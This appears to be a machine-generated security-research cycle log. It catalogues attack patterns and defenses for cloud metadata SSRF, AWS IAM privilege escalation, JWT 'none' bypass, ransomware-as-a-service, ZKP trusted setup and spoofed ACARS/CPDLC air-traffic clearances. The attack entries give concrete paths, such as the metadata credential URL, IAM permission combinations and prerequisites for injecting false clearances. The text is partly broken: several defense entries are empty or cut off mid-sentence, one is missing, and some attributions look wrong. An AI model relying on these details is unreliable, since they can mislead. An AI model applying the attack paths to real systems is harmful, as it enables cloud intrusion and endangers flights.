    iOS/Chrome/Windows zero-days; higher than bug bounties for top-tier bugs;
    creates tension between CVD and exploit sales market
  CVD tension: some vendors slow to patch; researchers frustrated;
    disclose without fix (full disclosure debate); Google Project Zero
    90-day policy with public release regardless of patch status

D339 — Cloud Security Architecture (Multi-Cloud, Cloud-Native)
  Description: IAM in cloud (AWS IAM, Azure AD, GCP IAM); shared
  responsibility model; cloud-specific attack patterns; CSPM (Cloud Security
  Posture Management); CIEM (Cloud Infrastructure Entitlement Management)
  AWS IAM: roles, policies, cross-account trust; confused deputy attacks
  (AWS Resource-Based Policy + Role trust policy interaction);
  metadata service SSRF (IMDSv1 — unauthenticated; IMDSv2 — session tokens);
  privilege escalation via IAM: PassRole, CreatePolicyVersion, AttachUserPolicy
  Azure: managed identities; conditional access; PIM (Privileged Identity
  Management); Azure AD role escalation; shared access signatures
  GCP: Workload Identity Federation; service account keys (insecure default);
  GKE Workload Identity
  Shared responsibility: cloud provider secures infrastructure; customer
  secures configuration; most cloud breaches are misconfiguration, not
  provider vulnerability (Capital One 2019: IMDSv1 SSRF; Twitch 2022: S3 public)

PATTERN 39.1 — CLOUD METADATA SERVICE SSRF AS CREDENTIAL THEFT AMPLIFIER
─────────────────────────────────────────────────────────────────────────────
Classification: R05 (state confusion — server fetches attacker URL);
R10.6 (feature-security context mismatch); Domain: D339 (cloud)

Cloud instance metadata service (IMDS): every cloud VM has a local HTTP
endpoint (AWS: 169.254.169.254; Azure: 169.254.169.254; GCP: 169.254.169.254)
returning instance metadata including temporary IAM credentials for the
instance role. This is the legitimate mechanism for granting cloud permissions
to EC2/VM workloads without embedding permanent credentials.

IMDSv1 (AWS, deprecated but still available by operator choice):
  Request: HTTP GET http://169.254.169.254/latest/meta-data/iam/security-credentials/[role]
  Authentication: none (accessible from any process on the instance or via SSRF)
  SSRF attack: application on EC2 that fetches user-supplied URLs;
    attacker sends URL = http://169.254.169.254/latest/meta-data/iam/security-credentials/
    application fetches URL; returns response to attacker (in error message, redirect, etc.)
    attacker reads temporary AWS credentials (AccessKeyId, SecretAccessKey, SessionToken)
    attacker uses credentials to call AWS APIs as instance role
  Capital One (2019): WAF misconfiguration; IMDSv1 SSRF; attacker obtained
    EC2 instance role credentials; accessed S3 buckets; 100M records exfiltrated

IMDSv2 (AWS): requires PUT with X-aws-ec2-metadata-token-ttl-seconds first;
  receives session token; subsequent GET requires session token in header;
  SSRF typically cannot perform PUT and GET in sequence (one-step SSRF fails);
  requires app to support two-step HTTP; substantially reduces SSRF effectiveness

Pattern: cloud credential theft via SSRF amplifies effect:
  Without cloud: SSRF reads internal service data or internal network scan
  With cloud IMDS: SSRF reads temporary cloud credentials; pivots to all
  cloud resources accessible from instance role; typical role has S3 access,
  DynamoDB access, secrets manager access — full tenant data exposed

─────────────────────────────────────────────────────────────────────────────
PATTERN 39.2 — RANSOMWARE-AS-A-SERVICE: CRIMINAL SUPPLY CHAIN PARALLEL
─────────────────────────────────────────────────────────────────────────────
Classification: R08 (supply chain — criminal ecosystem); Domain: D337

RaaS (Ransomware-as-a-Service) applies software supply chain economics to
criminal operations. The parallel to legitimate SaaS is structurally complete:
  Operators: develop and maintain ransomware infrastructure (encryption,
    C2, payment portal, leak site, negotiation team); equivalent to SaaS vendor
  Affiliates: perform initial compromise and deployment; equivalent to SaaS customers
  Initial Access Brokers: provide foothold; equivalent to lead-generation services
  Negotiation specialists: maximize ransom payment; equivalent to sales/CS
  Money laundering services: convert crypto to fiat; equivalent to payment processing

This specialization enables:
  (a) Volume scaling: one operator can support hundreds of affiliates simultaneously;
      attack rate scales with affiliate count, not operator headcount
  (b) Quality separation: operators optimize payload (evasion, encryption speed);
      affiliates optimize compromise (phishing, lateral movement)
  (c) Market efficiency: IAB market prices access by target value;
      ransomware affiliate competition drives up ransom demands
  (d) Resilience: takedown of one affiliate doesn't affect operators;
      takedown of operators (REvil 2021) disrupts affiliates temporarily;
      affiliates migrate to new operator

Major RaaS ecosystem events:
  REvil (Sodinokibi): Kaseya VSA supply chain attack (2021); 1,500 MSP clients;
    $70M initial demand; disrupted by US/Russia coordinated action; 2022 comeback
  LockBit: highest-volume RaaS 2022-2023; LockBit 3.0 (BlackMatter code merge);
    FBI/Europol takedown February 2024; LockBit resumed weeks later
  Cl0p: MOVEit Transfer vulnerability (CVE-2023-34362); SQL injection in
    MOVEit file transfer; mass exploitation; data theft from 2,000+ organizations;
    no encryption (data theft only); 62M+ affected
  ALPHV/BlackCat: Rust-based; cross-platform; Change Healthcare attack (2024);
    healthcare payment processing disrupted for weeks; $22M ransom

─────────────────────────────────────────────────────────────────────────────
PATTERN 39.3 — IAM PRIVILEGE ESCALATION: PERMISSION BOUNDARY BYPASS
─────────────────────────────────────────────────────────────────────────────
Classification: R03 (privilege escalation); Domain: D339 (cloud IAM)

AWS IAM privilege escalation paths (Shane Hanna taxonomy, 40+ paths):
  Common structure: a lower-privilege identity has permission to perform
  an action that transitively grants higher privilege

Path class 1: Create/attach policy
    Permissions: iam:CreatePolicyVersion + iam:AttachUserPolicy
    Action: create new policy version with AdministratorAccess;
      attach to own user
    Effect: own user becomes Administrator

Path class 2: Pass role + create compute resource
    Permissions: iam:PassRole + ec2:RunInstances (or lambda:CreateFunction)
    Action: create EC2 instance with admin role attached;
      access instance metadata to retrieve admin role credentials
    Effect: admin credentials from instance role

Path class 3: Update lambda function code
    Permissions: lambda:UpdateFunctionCode on function with admin role
    Action: upload malicious function code; function executes as admin role;
      exfiltrates credentials or performs admin actions
    Effect: admin access via lambda execution

Path class 4: Create user/key with higher privilege
    Permissions: iam:CreateUser + iam:CreateAccessKey + iam:AttachUserPolicy
    Action: create new user; attach admin policy; generate access key

Pattern property: each path uses only legitimate AWS API calls;
    no exploit of vulnerability in IAM engine itself;
    the vulnerability is in the configuration of who can perform which actions;
    IAM policy is the security boundary; overly-permissive IAM = escalation path

CIEM (Cloud Infrastructure Entitlement Management): tools that enumerate
    all privilege escalation paths in IAM configuration; Brainboard, Sonrai,
    Wiz, Prisma Cloud; analogous to BloodHound for AD but for cloud IAM

─────────────────────────────────────────────────────────────────────────────
PATTERN 39.4 — ZKP TRUSTED SETUP AS CRYPTOGRAPHIC SINGLE POINT OF FAILURE
─────────────────────────────────────────────────────────────────────────────
Classification: R04 (cryptographic weakness — setup failure); Domain: D336

zk-SNARK (Groth16 proof system) requires a trusted setup ceremony:
  During setup: random values ('toxic waste') used to compute structured
  reference string (SRS); SRS is public and used by all provers/verifiers;
  if toxic waste is retained (not destroyed), holder can forge valid proofs
  for false statements — breaking the soundness of the entire system

This is a single point of cryptographic failure:
    (a) Anyone with toxic waste can create proofs that verify as correct
        but prove false statements
    (b) There is no way to detect that a proof was forged using toxic waste
    (c) All proofs created under that setup are suspect if compromise occurred

Powers-of-Tau ceremony (Zcash, 2018):
    Multi-party computation (MPC) setup: N participants each contribute;
    toxic waste is destroyed if ANY ONE participant is honest;
    1,000+ participants globally; extremely high trust level
    Caveat: if all participants are dishonest (colluding) OR if all their
    random deletion claims are false, the setup is compromised;
    cannot be externally verified

Contrast with hash-based ZKP (zk-STARK):
    No trusted setup required; security relies on hash function collision
    resistance; quantum-resistant; larger proof size (tradeoff)
    STARKs avoid the trusted setup single point of failure entirely

Pattern: any cryptographic system with a trusted setup ceremony introduces
a one-time single point of failure; the ceremony quality determines
whether that SPOF was successfully avoided; there is no ongoing verification
after the fact.

PATTERNS CUMULATIVE: 156 (39.1-39.4)

ANATOMY G210 [CLOSING BACKLOG]: ACARS IN AIR TRAFFIC CONTROL OPERATIONS
────────────────────────────────────────────────────────────────────────────────
SUBJECT: Aircraft Communications Addressing and Reporting System (ACARS)
DOMAIN: Aviation safety communications / digital datalink
ROOT MECHANICS: R01 (RF/broadcast), R04 (authentication absent), R06.ARCH

LAYER 1 — PHYSICAL:
  ACARS operates on VHF (118-136 MHz), HF (3-30 MHz), and SATCOM (INMARSAT,
  Iridium). VHF subnetwork: ARINC 618/619 protocol. Ground stations relay via
  SITA or ARINC networks to airline operations centers. Aircraft transponder
  and CMU (Communications Management Unit) handle uplink/downlink.

LAYER 2 — PROTOCOL:
  Message structure: aircraft address (7-char ICAO), airline (3-char), flight
  number, message label (2-char type code), text payload. No mandatory
  encryption or authentication in baseline specification. Message types include
  departure/arrival reports, weather requests, ATC clearances, ATIS, METAR.

LAYER 3 — OPERATIONAL USE:
  ATC datalink via CPDLC (Controller-Pilot Data Link Communications) rides over
  ACARS infrastructure. CPDLC messages include: direct-to waypoint clearances,
  altitude changes, route modifications, frequency changes. Voice backup required
  by regulations but procedurally secondary in high-workload CPDLC environments.

LAYER 4 — ATTACK SURFACE:
  [A] Message injection: craft valid ACARS frame (aircraft address spoofed from
      publicly available ADS-B data), transmit on VHF frequency. No
      cryptographic barrier. Recipient CMU processes as legitimate.
  [B] CPDLC injection via ACARS: spoofed ATC clearance delivered to flight deck.
      Pilots trained to cross-check with voice; in high traffic with CPDLC
      saturation, voice verification may be skipped for 'routine' messages.
  [C] Weather/ATIS injection: false METAR, false SIGMET. Affects departure
      planning, fuel loads, route selection.
  [D] Replay attacks: replay authentic ACARS messages at incorrect time/location.
  [E] Denial of service: frequency jamming (RF), or high-volume message flooding
      to saturate CMU processing queue.

LAYER 5 — DEMONSTRATED CAPABILITY:
  Hugo Teso (2013): Aircraft Hacking - Practical Aero Series. Demonstrated ACARS
  message injection using SDR (NooElec RTL-SDR) and custom ACARS decoder/encoder.
  Crafted messages accepted by FMS simulator. FAA/EASA response: attack requires
  physical proximity; certified avionics behave differently than simulation.
  Samy Kamkar / Markus Maurer: ACARS decoder (acarsdec) widely available;
  transmission requires licensed VHF radio but hardware trivially accessible.

LAYER 6 — DEFENSE STATE:
  ATN/IPS (Aeronautical Telecommunications Network over IP): provides PKI-based
  authentication for CPDLC. Mandated in ICAO Doc 9705. Deployment: Europe
  (EUROCONTROL) partial; US (FAA NextGen) partial; global coverage incomplete.
  VDL Mode 2 (VHF Data Link): improved data rate, still no authentication.
  Proprietary airline networks (SITA, ARINC): add application-layer controls
  but coverage depends on ground station network membership.

LAYER 7 — ARCHITECTURAL CONSTRAINT:
  ACARS installed base: ~10,000+ aircraft worldwide. Retrofit requires CMU
  hardware upgrade + avionics certification (FAA STC or EASA ETSO). Timeline:
  10-20 year full fleet replacement. LAW-1 applies directly.

CONVERGENCE:
  ACARS parallels ADS-B exactly: RF broadcast, unauthenticated, critical safety
  function, massive installed base, decade-scale replacement horizon.
  R01.LIFE-SAFETY confirmed for ACARS. R06.ARCH: ground-station relay
  architecture was not designed with adversarial injection as threat model.
  Pattern 36.2 candidate: ICAO ATN/IPS mandate creates production/legacy split.
STATUS: G210 CLOSED

ANATOMY G242 [NEW]: AWS IMDSv1 vs IMDSv2 ADOPTION RATES
────────────────────────────────────────────────────────────────────────────────
SUBJECT: EC2 Instance Metadata Service version adoption and SSRF exposure
DOMAIN: Cloud security / AWS infrastructure
ROOT MECHANICS: R05 (privilege amplification), R10.6 (feature-security mismatch)

LAYER 1 — PROTOCOL DIFFERENCE:
  IMDSv1: single HTTP GET to 169.254.169.254/latest/meta-data/. No authentication.
  Any process with HTTP access (including SSRF) retrieves credentials.
  IMDSv2: session-oriented. Step 1: PUT request with TTL header to get session
  token. Step 2: GET with X-aws-ec2-metadata-token header. PUT is blocked by
  standard SSRF (most web frameworks/proxies disallow PUT from user-supplied URLs).

LAYER 2 — ADOPTION MECHANICS:
  IMDSv2 released: November 2019. Retroactive enforcement: November 2024 (AWS
  announced requirement for new instances). Existing instances: operator must
  explicitly enable IMDSv2-only mode (aws ec2 modify-instance-metadata-options
  --http-tokens required). Default for new instances shifted to IMDSv2-required
  as of mid-2024 in many regions.

LAYER 3 — RESIDUAL EXPOSURE:
  [A] Instances launched before policy change: IMDSv1 still accessible unless
      explicitly remediated. Cloud estates with thousands of instances:
      remediation requires per-instance opt-in or IaC migration.
  [B] Containers on EC2: ECS tasks inherit host IMDSv1/v2 setting. Kubernetes
      pods on EC2 worker nodes: same inheritance. A compromised container can
      SSRF to 169.254.169.254 if worker node allows IMDSv1.
  [C] Lambda: separate metadata path; IMDSv2-equivalent controls differ.
  [D] Third-party AMIs: some application stacks explicitly set IMDSv1-required
      for compatibility; operator may not know.

LAYER 4 — ATTACK CHAIN COMPLETENESS:
  SSRF → IMDSv1 GET → iam/security-credentials/{role-name} → AccessKeyId +
  SecretAccessKey + Token → full IAM role permissions until credential rotation
  (typically 6 hours). Capital One 2019: this exact chain. Time from SSRF to
  credential extraction: seconds.

LAYER 5 — DETECTION GAP:
  IMDSv1 GET to 169.254.169.254 from within instance: looks like normal application
  behavior if app legitimately uses IMDS. Distinguishing SSRF-sourced IMDS call
  from application-sourced IMDS call requires application-layer logging (not
  available in standard CloudTrail/VPC flow logs at IMDS level).

CONVERGENCE:
  IMDSv1/v2 split is Pattern 36.2 in cloud context: AWS regulatory/policy mandate
  creates production/legacy split. Remediation requires active operator action;
  passive default migration insufficient for existing estate.
  R10.6: IMDS was designed as a feature (easy credential access for applications);
  SSRF is the security context mismatch (external input reaching internal network).
STATUS: G242 CLOSED

ANATOMY G236 [CYCLE 1 OF 5]: R10.6 COUNTER-EXAMPLE SCAN
────────────────────────────────────────────────────────────────────────────────
SUBJECT: Search for features whose security context mismatch does NOT produce
         exploitable vulnerability at scale
HYPOTHESIS TO FALSIFY: Every dual-use feature (designed for legitimate purpose,
  capable of security violation in adversarial context) eventually produces
  exploitable vulnerability at meaningful scale.

CANDIDATE COUNTER-EXAMPLES (cycle 1):

[CE-1] OAuth PKCE (Proof Key for Code Exchange)
  Feature designed for: prevent authorization code interception in public clients
  Security context: adds code_verifier/code_challenge step
  Mismatch test: PKCE exists as 'extra step' that could be bypassed if server
    doesn't enforce. RFC 7636 requires server enforcement.
  Result: when PKCE is implemented correctly, mismatch is closed by design.
    However: servers that make PKCE optional (pre-2022 many implementations)
    created R10.6 pattern (feature available but unenforced). RFC 9700 (2025)
    mandates PKCE for all OAuth 2.1 flows. This is the remediation path.
  Verdict: NOT a counter-example. PKCE optional enforcement IS R10.6 instance.

[CE-2] JWT 'none' algorithm
  Feature designed for: unsigned tokens for internal use (RFC 7519 includes 'none')
  Security context mismatch: servers accepting 'none' on externally-supplied JWTs
  Result: CVE-2015-9235 and variants. Widely exploited. Confirmed R10.6 instance.
  Verdict: NOT a counter-example.

[CE-3] CSS @import in user-generated content
  Feature designed for: stylesheet modularity
  Security context: allowing @import in user-generated CSS enables CSRF data
    exfiltration (CSS injection). Known attack class.
  Result: Confirmed vulnerability class. NOT a counter-example.

[CE-4] DNS recursion (open resolvers)
  Feature designed for: full DNS resolution for any client
  Security context mismatch: open resolver enables amplification DDoS
  Result: Confirmed attack class (DNS amplification). NOT a counter-example.

[CE-5] TCP timestamps (RFC 1323)
  Feature designed for: RTT measurement, PAWS (Protection Against Wrapped Seqs)
  Security context mismatch: timestamps enable OS fingerprinting and uptime
    inference; minor information leakage
  Result: Low-severity information leakage only. Not mass-exploited. Mitigated
    by randomizing timestamp offsets (Linux kernel default since ~2014).
  Assessment: R10.6 mismatch exists but impact is minimal and self-mitigated.
    POTENTIAL PARTIAL counter-example: dual-use feature, security mismatch,
    but NOT exploitable at scale without compounding factors.

CYCLE 1 RESULT:
  CE-1 through CE-4: all confirm R10.6 pattern (not counter-examples).
  CE-5 (TCP timestamps): potential partial counter-example. The mismatch exists
  but produced only marginal exploitability, now self-remediated. Does not
  falsify R10.6 universally but may bound the hypothesis: 'features with ONLY
  information leakage and no action-enabling capability may not reach threshold.'
  This is a refinement candidate, not a falsification.
  R10.6 STATUS: counter-example cycle 1 of 5 complete. Not found. Refinement
  candidate logged (TCP timestamps). 4 cycles remain.

ANATOMY G241 [NEW]: EXPLOIT MARKET vs. CVD ECOSYSTEM
────────────────────────────────────────────────────────────────────────────────
SUBJECT: Vulnerability disclosure ecosystem — coordinated disclosure vs.
         commercial exploit brokerage
DOMAIN: Vulnerability economics / threat intelligence
ROOT MECHANICS: R02 (attack economics), R07 (disclosure coordination)

LAYER 1 — CVD (COORDINATED VULNERABILITY DISCLOSURE) MODEL:
  Discoverer reports to vendor. Vendor patches. Public disclosure after patch
  (typically 90-day deadline from Google Project Zero). CVEs assigned via CNA
  (CVE Numbering Authority) network. CVSS scoring provides severity metric.
  Bug bounty programs (HackerOne, Bugcrowd) incentivize researchers: $500-$1M
  depending on platform and severity.

LAYER 2 — COMMERCIAL EXPLOIT MARKET:
  Zerodium (founded 2015): public acquisition prices for 0-days.
  Published payouts (2023-2024 pricing):
    iOS full chain (0-click, remote): $2,500,000
    Android full chain (0-click, remote): $2,500,000
    WhatsApp 0-click RCE: $1,500,000
    Chrome sandbox escape: $500,000
    Windows LPE: $400,000
    Microsoft Exchange RCE: $400,000
  Buyers: law enforcement, intelligence agencies, military customers.
  Secondary market: NSO Group (Pegasus), Candiru, Intellexa, DSIRF.

LAYER 3 — ECONOMIC COMPETITION:
  For a researcher finding a critical iOS 0-day:
    Apple Bug Bounty: up to $1,000,000 (Security Research Device program, 2020+)
    Zerodium: up to $2,500,000
  Differential: $1.5M incentive against disclosure. Even at parity, exploit
  market offers certainty (no negotiation, guaranteed payout) vs. bounty
  (subjective severity assessment, potential disputes).

LAYER 4 — SYSTEMIC EFFECT:
  [A] Vulnerability retention: critical vulnerabilities sold to Zerodium may
      remain unpatched for 12-36 months while used operationally.
  [B] Weaponization diffusion: NSA EternalBlue retained for ~5 years (est.) before
      Shadow Brokers leak (2017). Vulnerability then weaponized in WannaCry,
      NotPetya within weeks. Classic HNDL-analog for exploits.
  [C] CVD ecosystem erosion: researchers with high-value finds increasingly bypass
      CVD entirely. Vendor visibility into critical vulnerability landscape degrades.
  [D] Patch timeline distortion: vendor cannot patch what it doesn't know. MTTR
      (mean time to remediation) becomes undefined for retained 0-days.

LAYER 5 — GOVERNANCE RESPONSE:
  EU Cyber Resilience Act (2024): imposes vulnerability disclosure requirements
  on product manufacturers. ENISA receives reports. Does not regulate researcher
  behavior or restrict commercial market.
  US CISA: Known Exploited Vulnerabilities (KEV) catalog. No authority over
  commercial exploit sales. First Amendment constraints (US) limit regulation
  of security research publication.
  Wassenaar Arrangement: attempted to control 'intrusion software' exports (2013);
  revised 2017 after security community pushback. Partial export controls only.

LAYER 6 — STRUCTURAL ASYMMETRY:
  Defenders: must patch all known vulnerabilities across entire estate, continuously.
  Attackers: need only one unpatched vulnerability per target, from retained pool.
  Commercial exploit market widens this asymmetry by extending the window during
  which high-value vulnerabilities remain unknown to defenders.

CONVERGENCE:
  R02 (attack economics): exploit market is direct market for offensive capability.
  Prices are revealed preferences — $2.5M for iOS 0-click reflects genuine
  operational value. LAW-2 inverse: complexity of exploit does not reduce market
  because buyers pay for full chain, not individual steps.
  LAW-1 partial: CVD ecosystem depends on vendor response; vendor PSIRT capacity
  is finite. Large vendors (Google, Microsoft, Apple) have mature PSIRT;
  industrial control system vendors often do not.
STATUS: G241 CLOSED

STAGE 3 SUMMARY:
  Anatomies this cycle: G210 (ACARS/CPDLC), G242 (IMDSv1/v2), G236 (R10.6 CE
  cycle 1), G241 (exploit market)
  Cumulative anatomies: 123
  Anatomy backlog: 0 (FIRST TIME IN LOOP HISTORY)

  G242 CLOSED: IMDSv1/v2 split is R10.6 + Pattern 36.2 in cloud context

NEW ATTACKS THIS CYCLE:

[A319] ACARS CPDLC message injection
  Mechanism: SDR transmit on VHF frequency; craft ARINC 618 frame with spoofed
  aircraft address; inject false ATC clearance via CPDLC uplink path.
  Prerequisites: VHF transceiver (~$500 SDR + amplifier), aircraft ICAO address
  (from ADS-B public feed), proximity to target (line-of-sight VHF ~200km).
  Impact: pilot receives false clearance; if voice cross-check omitted,
  executes incorrect altitude/route change. Safety-of-flight.
  Root: R01.LIFE-SAFETY, R04

[A320] AWS IMDSv1 credential theft via SSRF
  Mechanism: SSRF in web application reaches 169.254.169.254/latest/meta-data/
  iam/security-credentials/{role}. Returns temporary credentials valid 6 hours.
  Escalation: credentials used externally via AWS CLI to assume further roles,
  exfiltrate S3, pivot to other services.
  Prerequisites: SSRF vulnerability in application running on EC2 with
  IMDSv1-enabled instance and IAM role attached.
  Impact: full IAM role compromise; lateral movement across AWS account.
  Root: R05, R10.6

[A321] RaaS affiliate initial access via phishing + credential stuffing
  Mechanism: RaaS affiliate purchases stolen credentials from IAB or conducts
  phishing campaign. Establishes foothold. Deploys affiliate's tooling (Cobalt
  Strike, Brute Ratel). Operator's ransomware payload delivered at end of dwell.
  Dwell time: median 5-21 days (Mandiant M-Trends 2023).
  Impact: full domain compromise; ransomware deployment; double extortion.
  Root: R08

[A322] JWT 'none' algorithm signature bypass
  Mechanism: modify JWT header alg field to 'none'; remove signature. Server
  accepting 'none' validates as authentic. Grants arbitrary claims (admin, etc.).
  Prerequisites: server implementation accepts 'none' algorithm.
  Impact: authentication bypass; privilege escalation to any JWT-encoded role.
  Root: R10.6

[A323] ZKP trusted setup compromise (Powers-of-Tau)
  Mechanism: if any participant in trusted setup ceremony retains toxic waste
  (their randomness contribution), they can forge proofs for any statement.
  Forged proof is computationally indistinguishable from valid proof.
  Prerequisites: participation in MPC ceremony (or single-party setup).
  Impact: entire ZKP system broken; false proofs accepted as valid.
  Root: R04

[A324] Exploit market 0-day retention (EternalBlue archetype)
  Mechanism: nation-state acquires or develops 0-day; retains for operational use
  without disclosure. Third-party acquires/leaks (Shadow Brokers 2017). Attack
  tool proliferates. WannaCry, NotPetya weaponize within 77 days of patch release.
  Prerequisites: attacker with exploit development capability or market access.
  Impact: civilizational-scale; ~$10B NotPetya estimated damage.
  Root: R02, R07

[A325] AWS IAM PassRole privilege escalation
  Mechanism: principal with iam:PassRole + lambda:CreateFunction +
  lambda:InvokeFunction can attach any role (including admin) to Lambda function;
  invoke to execute arbitrary actions as that role.
  Prerequisites: iam:PassRole permission on target role; lambda create permissions.
  Impact: privilege escalation to any IAM role reachable via PassRole.
  Root: R03, R05

[D440] ATN/IPS PKI authentication for CPDLC

  Limitation: LAW-1 constraint; legacy CMU hardware may not support ATN/IPS.

[D441] JWT algorithm allowlisting
  Mechanism: server explicitly allowlists permitted algorithms (e.g., RS256 only).
  Rejects 'none' and any unrecognized algorithm. Library-level: jose, PyJWT,

[D442] ZKP trusted setup MPC ceremony (Powers-of-Tau)

  Limitation: MPC ceremony trust model requires social/procedural guarantees.

[D444] IAM permission boundary + SCP layering
  Mechanism: IAM permission boundaries limit maximum permissions a role can have,

CYCLE 39 — STAGE 5: CROSS-DOMAIN CONVERGENCE & META-PATTERN EVOLUTION
════════════════════════════════════════════════════════════════════════════════
ENTERING STATE: 277 convergence findings cumulative

[CF278] ACARS/ADS-B structural isomorphism
  Two independent aviation systems (ACARS: datalink messaging; ADS-B: position
  broadcast) share identical attack surface architecture: RF broadcast,
  unauthenticated, safety-critical, massive installed base, decade-scale
  replacement horizon. The convergence is not coincidental — both systems were
  designed in the pre-adversarial era of civil aviation (1970s-1990s) when the
  threat model was equipment failure, not deliberate injection.
  Root mechanics shared: R01.RF + R01.LIFE-SAFETY + R04 + LAW-1.
  Implication: any aviation communication or navigation system designed in this
  era requires adversarial re-examination. ATC radar (ATCRBS Mode C): also
  unauthenticated. ILS glide slope: RF spoofable. Pattern is systemic.

[CF279] Exploit market as institutional HNDL analog
  HNDL (Harvest Now, Decrypt Later): adversary collects encrypted data today;
  decrypts when quantum capability matures. Exploit market analog: adversary
  (or nation-state) retains 0-day; deploys when strategically optimal or loses
  control (Shadow Brokers). Both patterns share: temporal weapon storage,
  asymmetric information (defender unaware of held capability), civilizational-
  scale potential impact when released. EternalBlue: retained ~5 years; released
  into WannaCry/NotPetya within 77 days of patch. PQC transition: HNDL collected
  data may be decrypted in 10-20 year horizon. Structural isomorphism confirmed.

[CF280] R10.6 refinement — action-enabling vs. information-only threshold
  TCP timestamps (CE-5, G236 cycle 1) vs. pickle/Log4j JNDI/SSRF: the former
  produces only information leakage (uptime, OS fingerprint) without enabling
  attacker action in isolation. The latter enable direct code execution or
  credential theft. Proposed R10.6 refinement:
    R10.6-THRESHOLD: feature-security context mismatch produces exploitable
    vulnerability at scale IFF the mismatch enables attacker ACTION (code
    execution, authentication bypass, data exfiltration) not merely information
    leakage. Information-only mismatches are self-limiting (low CVSSv3 impact
    scores; mitigated at kernel level without protocol change).
  This refinement does not falsify R10.6; it defines a sub-class boundary.
  Status: DRAFT refinement; 4 counter-example cycles remain for R10.6 proper.

[CF281] Pattern 36.2 aviation instance: ICAO ATN/IPS mandate
  Pattern 36.2: regulatory mandate creates production/legacy split with defined
  remediation timeline. Instance 4: ICAO ATN/IPS mandate for CPDLC authentication.
  EUROCONTROL LINK 2000+: operational in European upper airspace. FAA DataComm:
  operational at 56+ major US airports (as of 2023). Global legacy: thousands of
  aircraft with ACARS-only CMU, requiring hardware replacement + avionics
  certification for ATN/IPS upgrade.
  Pattern 36.2 now: 4 confirmed instances (automotive AUTOSAR SecOC, aviation
  ATN/IPS, medical IEC 62443, cloud IMDSv2 mandate).

[CF282] CVD ecosystem as distributed early warning system — and its failure mode
  CVD, when functioning, provides defenders with: (1) patch before exploit
  weaponization; (2) CVSS severity for patch prioritization; (3) public
  disclosure drives awareness. Commercial exploit market degrades all three:
  (1) patches cannot exist for retained vulnerabilities; (2) CVSS undefined
  for unknown vulnerabilities; (3) awareness zero until Shadow Brokers-type
  event. CVD failure mode is not random — it tracks economic incentive differential.
  Where exploit market payout > bug bounty payout, CVD degrades systematically.
  Currently: iOS/Android critical 0-click; Chrome full chain; Exchange RCE.
  These are exactly the highest-impact platforms. Correlation is not coincidence.

[CF283] RaaS criminal supply chain as LAW-2 inversion mechanism
  LAW-2: technical complexity is not a sustained barrier to attack. RaaS operationalizes
  this: an affiliate with zero malware development capability can deploy
  enterprise-grade ransomware (LockBit 3.0, ALPHV BlackCat) by joining affiliate
  program. Barrier to entry: criminal reputation, proof of past access, affiliate
  fee split (~20-30% to operator). The operator handles: malware development,
  C2 infrastructure, negotiation portal, data leak site. Affiliate handles only:
  initial access. This division of labor means any actor capable of phishing or
  credential stuffing is capable of ransomware deployment. LAW-2 at its most direct.

[CF284] IMDSv1/v2 as cloud-era R10.6 archetype
  IMDSv1 was designed as a convenience feature (applications retrieve their own
  credentials without hardcoding). The security context mismatch: SSRF turns any
  application into a credential retrieval endpoint for attackers. IMDSv2 patches
  the mismatch at protocol level (PUT requirement). The adoption pattern mirrors
  every other R10.6 instance: (1) feature deployed for legitimate use; (2) attack
  class discovered; (3) protocol-level fix designed; (4) adoption requires active
  operator action; (5) legacy tail persists for years. Capital One 2019 is the
  canonical incident. Four years after IMDSv2 release, AWS required enforcement
  for new instances — legacy instances still require manual remediation.

R10.5 COUNTER-EXAMPLE STATUS UPDATE (cycle 5 of 5 — FINAL):
  R10.5 hypothesis: hardware timing/power side channels via compiler/microarch
  optimizations that create observable timing differentials not present in the
  abstract algorithm.
  Cycles 1-4: no falsifying counter-example found. Spectre/Meltdown, PRIME+PROBE,
  FLUSH+RELOAD, Bleichenbacher — all confirmed R10.5 (or R10.1∩R10.5a).
  Cycle 5 (this cycle): final scan for counter-example.
  CANDIDATE: constant-time cryptographic implementations (e.g., OpenSSL's
  BN_BLINDING, BEARSSL's constant-time AES, libsodium).
  Assessment: these are DEFENSES against R10.5, not counter-examples. Their
  existence confirms R10.5 is real (we need constant-time specifically because
  non-constant-time creates vulnerabilities). A defense is not a falsification.
  CANDIDATE: formally verified timing properties (e.g., CT-Verif, binsec/haunted).
  Assessment: formal verification can confirm a specific implementation is
  constant-time. This eliminates R10.5 for that implementation. But R10.5
  taxonomy is about the substrate class (hardware/compiler timing side channels);
  individual constant-time implementations don't falsify the substrate class.
  DECISION: R10.5 CLOSED — NOT FALSIFIED. 5 counter-example cycles complete.
  No instance found where the optimization-creates-timing-observable mechanism
  failed to produce exploitable vulnerability across all examined instances.
  R10.5 elevated from DRAFT to CONFIRMED sub-taxonomy.

R10 SUB-TAXONOMY STATUS (post-cycle 39):

  R10.2: CONFIRMED — correct implementation of flawed specification
  R10.3: CONFIRMED — interaction between two correct implementations
